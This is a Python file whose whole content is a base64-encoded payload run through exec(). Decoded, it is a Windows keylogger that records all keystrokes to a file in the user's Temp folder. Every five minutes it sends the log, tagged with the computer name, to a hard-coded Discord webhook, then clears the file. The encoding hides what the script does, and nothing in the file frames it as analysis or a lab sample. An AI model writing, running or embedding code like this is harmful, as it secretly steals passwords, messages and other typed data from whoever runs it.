import base64
decoded_data = base64.b64decode("aW1wb3J0IHRocmVhZGluZyx0aW1lDQoNCmRlZiBjaGVja01vZHVsZXMoKToNCiAgICB0cnk6DQogICAgICAgIGltcG9ydCBvcyxrZXlib2FyZCxyZXF1ZXN0cw0KICAgICAgICBwcmludCgiTW9kdWxlcyBpbnN0YWxsZWQgYWxyZWFkeSIpDQogICAgZXhjZXB0IE1vZHVsZU5vdEZvdW5kRXJyb3IgYXMgZXJyOg0KICAgICAgICBpZiAia2V5Ym9hcmQiIGluIHN0cihlcnIpOg0KICAgICAgICAgICAgb3Muc3lzdGVtKCJwaXAzIGluc3RhbGwga2V5Ym9hcmQiKQ0KICAgICAgICAgICAgcHJpbnQoIktleWJvYXJkIG1vZHVsZSBpbnN0YWxsZWQiKQ0KICAgICAgICAgICAgY2hlY2tNb2R1bGVzKCkNCiAgICAgICAgZWxpZiAicmVxdWVzdHMiIGluIHN0cihlcnIpOg0KICAgICAgICAgICAgb3MucnVuKCJwaXAzIGluc3RhbGwgcmVxdWVzdHMiKQ0KICAgICAgICAgICAgcHJpbnQoIlJlcXVlc3RzIG1vZHVsZSBpbnN0YWxsZWQiKQ0KICAgICAgICAgICAgY2hlY2tNb2R1bGVzKCkNCg0KZGVmIHJlYWRLZXkoKToNCiAgICBpbXBvcnQgb3Msa2V5Ym9hcmQNCiAgICBsYXN0X2tleSA9IE5vbmUNCiAgICB3aXRoIG9wZW4oIkM6XFxVc2Vyc1xcIitzdHIob3MuZ2V0bG9naW4oKSkrIlxcQXBwRGF0YVxcTG9jYWxcXFRlbXBcXEFub25TZWMubG9nIiwidyIpIGFzIGY6DQogICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICBkYXRhPWtleWJvYXJkLnJlYWRfa2V5KCkNCiAgICAgICAgICAgIGlmIGRhdGEgIT0gbGFzdF9rZXk6DQogICAgICAgICAgICAgICAgaWYgZGF0YSA9PSAic3BhY2UiOg0KICAgICAgICAgICAgICAgICAgICBkYXRhID0gIiAiDQogICAgICAgICAgICAgICAgZWxpZiBkYXRhID09ICJlbnRlciI6DQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSAiXG4iDQogICAgICAgICAgICAgICAgZWxpZiBkYXRhID09ICJ0YWIiOg0KICAgICAgICAgICAgICAgICAgICBkYXRhID0gIlx0Ig0KICAgICAgICAgICAgICAgIGVsaWYgZGF0YSBpbiBbInNoaWZ0IiwicmlnaHQgc2hpZnQiLCJsZWZ0IHNoaWZ0IiwiY2FwcyBsb2NrIl06DQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSAiIg0KICAgICAgICAgICAgICAgIGVsaWYgZGF0YSBpbiBbImJhY2tzcGFjZSIsImRlbGV0ZSIsImRlbCIsImN0cmwiLCJsZWZ0IGN0cmwiLCJyaWdodCBjdHJsIiwiYWx0IiwibGVmdCBhbHQiLCJyaWdodCBhbHQiLCJmbiIsImxlZnQgd2luZG93cyIsInJpZ2h0IHdpbmRvd3MiXToNCiAgICAgICAgICAgICAgICAgICAgZGF0YSA9IGYiW3tkYXRhfV0iDQogICAgICAgICAgICAgICAgZi53cml0ZShkYXRhKQ0KICAgICAgICAgICAgICAgIGYuZmx1c2goKQ0KICAgICAgICAgICAgICAgIGxhc3Rfa2V5ID0gZGF0YQ0KICAgICAgICAgICAgZWxpZiBkYXRhID09IGxhc3Rfa2V5Og0KICAgICAgICAgICAgICAgIGRhdGEgPSAiIg0KICAgICAgICAgICAgICAgIGxhc3Rfa2V5ID0gTm9uZQ0KDQoNCmRlZiBzZW5kS2V5cyhkYXRhaCk6DQogICAgaW1wb3J0IG9zLHJlcXVlc3RzLHRpbWUNCiAgICB3ZWJob29rX2xpbms9Imh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMzUxOTI3MjM5Mjk0MzYxOTAvX3NiUThJb3pmY1NqOWdwTFAtNXdMdjFVM2xJajc5b013bnN5MTlxeHh1bTZ2QVFNMDRQY2hXdmRBd09OTDFqWjJWei0iDQogICAgcmVxdWVzdHMucG9zdCh3ZWJob29rX2xpbmssanNvbj17J2VtYmVkcyc6W3sidGl0bGUiOiJMb2cgZnJvbSAiK3N0cihvcy5lbnZpcm9uWyJDT01QVVRFUk5BTUUiXSkrIiBhdCAiK3N0cih0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSDolTTolUyIpKSwiZGVzY3JpcHRpb24iOmRhdGFofV19KQ0KDQpkZWYgcnVuU2VuZCgpOg0KICAgIGltcG9ydCB0aW1lLG9zDQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgdGltZS5zbGVlcCgzMDApDQogICAgICAgIHdpdGggb3BlbigiQzpcXFVzZXJzXFwiK3N0cihvcy5nZXRsb2dpbigpKSsiXFxBcHBEYXRhXFxMb2NhbFxcVGVtcFxcQW5vblNlYy5sb2ciLCJyKyIpIGFzIGZoOg0KICAgICAgICAgICAgZGF0YWg9ZmgucmVhZGxpbmUoKQ0KICAgICAgICAgICAgaWYgZGF0YWg6DQogICAgICAgICAgICAgICAgZmguc2VlaygwKQ0KICAgICAgICAgICAgICAgIGZoLnRydW5jYXRlKCkNCiAgICAgICAgICAgICAgICBzZW5kS2V5cyhkYXRhaCkNCg0KY2hlY2tNb2R1bGVzKCkNCg0KdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9cmVhZEtleSxkYWVtb249VHJ1ZSkuc3RhcnQoKQ0KdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9cnVuU2VuZCxkYWVtb249VHJ1ZSkuc3RhcnQoKQ0KDQp3aGlsZSBUcnVlOg0KICAgIHRpbWUuc2xlZXAoMC4xKQ==").decode()
exec(decoded_data)